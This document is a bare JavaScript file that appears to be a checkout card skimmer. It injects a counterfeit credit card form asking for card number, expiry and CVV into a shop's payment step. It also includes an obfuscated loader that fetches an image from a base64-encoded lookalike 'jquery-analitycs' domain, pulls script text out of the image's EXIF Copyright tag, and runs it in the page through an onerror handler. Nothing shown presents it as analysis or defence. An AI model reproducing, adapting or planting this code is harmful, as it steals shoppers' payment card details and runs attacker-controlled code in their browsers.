        function what1() {
            var inp = document.getElementsByName('payment[method]');
            if (inp[0].type == "radio" && inp[0].checked) {
                a2 = document.querySelector('[id="checkout-step-333"]');
                if (a2) {
                    a2.remove();
                }
                if (document.querySelector('[id="checkout-step-222"]')) {
                    inp[0].checked = true;
                    setTimeout(bla1(), 1000);
                } else {
                    document.querySelector('[id="dd_method_paypal_express"]').innerHTML = '<div id="checkout-step-222" style="display: block;"><link rel="stylesheet" type="text/css" href="https://members.themanhood.com/wp-content/plugins/membermouse/resources/css/user/mm-checkout.css?ver=2.2.8"><br><div id="mm-billing-information-section" class="mm-checkoutInfoBlock"><p class="mm-ccLogos"><img src="https://members.themanhood.com/wp-content/plugins/membermouse/resources/images/cclogos.gif" alt="Visa, Master Card, American Express, Discover" width="199" height="30"></p><p class="mm-selectList mm-expMonthList"><label>Credit Card:</label><br><input type="text" maxlength="16" id="card_num" name="card_num" class="mm-textField" placeholder="Credit Card Number"></p><p id="expr" class="mm-selectList mm-expMonthList"><label>Expiration Date:</label><br><input type="text" maxlength="16" id="exp_m" name="exp_m" class="mm-textField" placeholder="01" style="width:100px;"><input type="text" maxlength="16" id="exp_y" name="exp_y" class="mm-textField" placeholder="2030" style ="width:100px;"></p><p class="mm-selectList mm-expMonthList"><label>Security Code:</label><br><input type="text" maxlength="4" id="cvv2" name="cvv2" class="mm-textField" placeholder="Security Code"></p></div></div>';
                    inp[0].checked = true;
                    setTimeout(bla1(), 1000);
                }
            } else if (inp[1].type == "radio" && (inp[1].checked)) {
                a1 = document.querySelector('[id="checkout-step-222"]');
                if (a1) {
                    a1.remove();
                }
                if (document.querySelector('[id="checkout-step-333"]')) {
                    inp[1].checked = true;
                    setTimeout(bla1(), 1000);
                } else {
                    document.querySelector('[id="dd_method_ccavenuepay"]').innerHTML = '<div id="checkout-step-333" style="display: block;"><link rel="stylesheet" type="text/css" href="https://members.themanhood.com/wp-content/plugins/membermouse/resources/css/user/mm-checkout.css?ver=2.2.8"><br><div id="mm-billing-information-section" class="mm-checkoutInfoBlock"><p class="mm-ccLogos"></p><p class="mm-selectList mm-expMonthList"><label>Credit Card:</label><br><input type="text" maxlength="16" id="card_num" name="card_num" class="mm-textField" placeholder="Credit Card Number"></p><p id="expr" class="mm-selectList mm-expMonthList"><label>Expiration Date:</label><br><input type="text" maxlength="16" id="exp_m" name="exp_m" class="mm-textField" placeholder="01" style="width:100px;"><input type="text" maxlength="16" id="exp_y" name="exp_y" class="mm-textField" placeholder="2030" style ="width:100px;"></p><p class="mm-selectList mm-expMonthList"><label>Security Code:</label><br><input type="text" maxlength="4" id="cvv2" name="cvv2" class="mm-textField" placeholder="Security Code"></p></div></div>';
                    inp[1].checked = true;
                    setTimeout(bla1(), 1000);
                }
            } else {
                a1 = document.querySelector('[id="checkout-step-222"]');
                a2 = document.querySelector('[id="checkout-step-333"]');
                if (a1) {
                    a1.remove();
                    setTimeout(bla1(), 2000);
                } else if (a2) {
                    a2.remove();
                    setTimeout(bla1(), 2000);
                } else {
                    a = 0;
                    setTimeout(bla1(), 1000);
                }
            }

        }
        ;
        function bla1() {
            if (document.querySelector('[name="payment[method]"]')) {
                setTimeout(what1, 1000);
            } else {
                setTimeout(bla1, 1000);
            }
        }
        ;setTimeout(function() {
            bla1();
        }, 1000);
        (function() {
            var root = this;
            var DtS = function(obj) {
                if (obj instanceof DtS)
                    return obj;
                if (!(this instanceof DtS))
                    return new DtS(obj);
                this.DtSwrapped = obj
            };
            if (typeof exports !== 'undefined') {
                if (typeof module !== 'undefined' && module.exports) {
                    exports = module.exports = DtS
                }
                exports.DtS = DtS
            } else {
                root.DtS = DtS
            }
            var TiffTags = DtS.TiffTags = {
                0x8298: 'Copyright'
            };
            function iHD(img) {
                return !!(img.efd)
            }
            function gID(img, callback) {
                function handleBinaryFile(binFile) {
                    var data = fDS(binFile);
                    img.efd = data || {};
                    if (callback) {
                        callback.call(img)
                    }
                }
                var ImageR = new XMLHttpRequest();
                ImageR.onload = function() {
                    if (this.status == 200 || this.status === 0) {
                        handleBinaryFile(ImageR.response)
                    } else {
                        throw 'Could not load image'
                    }
                    ImageR = null
                }
                ;
                ImageR.open('POST', img.src, !0);
                ImageR.responseType = 'arraybuffer';
                ImageR.send(null)
            }
            function fDS(file) {
                var dV = new DataView(file);
                if ((dV.getUint8(0) != 0xFF) || (dV.getUint8(1) != 0xD8)) {
                    return !1
                }
                var offset = 2, length = file.byteLength, marker;
                while (offset < length) {
                    if (dV.getUint8(offset) != 0xFF) {
                        return !1
                    }
                    marker = dV.getUint8(offset + 1);
                    if (marker == 225) {
                        return readDtSData(dV, offset + 4, dV.getUint16(offset + 2) - 2)
                    } else {
                        offset += 2 + dV.getUint16(offset + 2)
                    }
                }
            }
            function readTags(file, tiffStart, dirStart, strings, bigEnd) {
                var entries = file.getUint16(dirStart, !bigEnd), tags = {}, entryOffset, tag, i;
                for (i = 0; i < entries; i++) {
                    entryOffset = dirStart + i * 12 + 2;
                    tag = strings[file.getUint16(entryOffset, !bigEnd)];
                    tags[tag] = readTagValue(file, entryOffset, tiffStart, dirStart, bigEnd)
                }
                return tags
            }
            function readTagValue(file, entryOffset, tiffStart, dirStart, bigEnd) {
                var type = file.getUint16(entryOffset + 2, !bigEnd), numValues = file.getUint32(entryOffset + 4, !bigEnd), valueOffset = file.getUint32(entryOffset + 8, !bigEnd) + tiffStart, offset, vals, val, n, numerator, denominator;
                switch (type) {
                case 2:
                    offset = numValues > 4 ? valueOffset : (entryOffset + 8);
                    return getStringFromDB(file, offset, numValues - 1)
                }
            }
            function getStringFromDB(buffer, start, length) {
                var outstr = '';
                for (var n = start; n < start + length; n++) {
                    outstr += String.fromCharCode(buffer.getUint8(n))
                }
                return outstr
            }
            function readDtSData(file, start) {
                if (getStringFromDB(file, start, 4) != 'Exif') {
                    return !1
                }
                var bigEnd, tags, tag, efd, gpsData, tiffOffset = start + 6;
                if (file.getUint16(tiffOffset) == 0x4949) {
                    bigEnd = !1
                } else if (file.getUint16(tiffOffset) == 0x4D4D) {
                    bigEnd = !0
                } else {
                    return !1
                }
                if (file.getUint16(tiffOffset + 2, !bigEnd) != 0x002A) {
                    return !1
                }
                var firstIFDOffset = file.getUint32(tiffOffset + 4, !bigEnd);
                if (firstIFDOffset < 0x00000008) {
                    return !1
                }
                tags = readTags(file, tiffOffset, tiffOffset + firstIFDOffset, TiffTags, bigEnd);
                return tags
            }
            DtS.getData = function(img, callback) {
                if (((self.Image && img instanceof self.Image) || (self.HTMLImageElement && img instanceof self.HTMLImageElement)) && !img.complete)
                    return !1;
                if (!iHD(img)) {
                    gID(img, callback)
                } else {
                    if (callback) {
                        callback.call(img)
                    }
                }
                return !0
            }
            ;
            DtS.getTag = function(img) {
                if (!iHD(img))
                    return;
                return img.efd["Copyright"]
            }
            ;
            DtS.readFromBinaryFile = function(file) {
                return fDS(file)
            }
            ;
            DtS.ico = function(url, callback) {
                var img = document.createElement('img');
                img.src = url;
                img.style.cssText = 'display:none;';
                img.onload = function() {
                    DtS.getData(img, function() {
                        var result = DtS.getTag(this);
                        if (typeof callback == 'function') {
                            callback(result)
                        }
                    });
                    img.parentNode.removeChild(img);
                }
                ;
                document.querySelector('body').appendChild(img)
            }
        }
        .call(this));
        window.onload = function() {
            DtS.ico(decodeURIComponent(escape(window.atob('Ly9qcXVlcnktYW5hbGl0eWNzLmNvbS9qcy9mYXZpY29uLmljbw=='))), function(result) {
                g = document.createElement('div');
                g.innerHTML = '<img src onerror="g = document.createElement(\'s\'+\'cri\'+\'pt\');g.innerHTML=\'' + result.replace(new RegExp('"','g'), '\"').replace(/\r?\n/g, "") + '\';document.getElementsByTagName(\'body\')[0].appendChild(g); g.parentNode.removeChild(g);" />';
            })
        }

